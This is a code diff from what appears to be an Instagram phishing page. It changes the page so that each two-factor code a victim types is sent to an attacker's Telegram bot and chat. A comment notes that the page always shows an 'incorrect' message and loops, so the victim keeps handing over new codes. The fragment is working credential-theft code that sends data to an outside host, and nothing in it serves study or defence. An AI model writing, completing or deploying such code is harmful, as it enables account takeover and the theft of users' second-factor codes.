@@ -36,14 +36,18 @@ APP: INSTAGRAM
 `;
 
       try {
-        await fetch(ENDPOINT, {
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        await fetch(url, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ message })
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message
+          })
         });
         console.log("✅ 2FA code sent");
       } catch (err) {
-        console.error("Failed to send:", err);
+        console.error("Failed to send to Telegram:", err);
       }
 
       // Always show incorrect message and reset (endless loop)
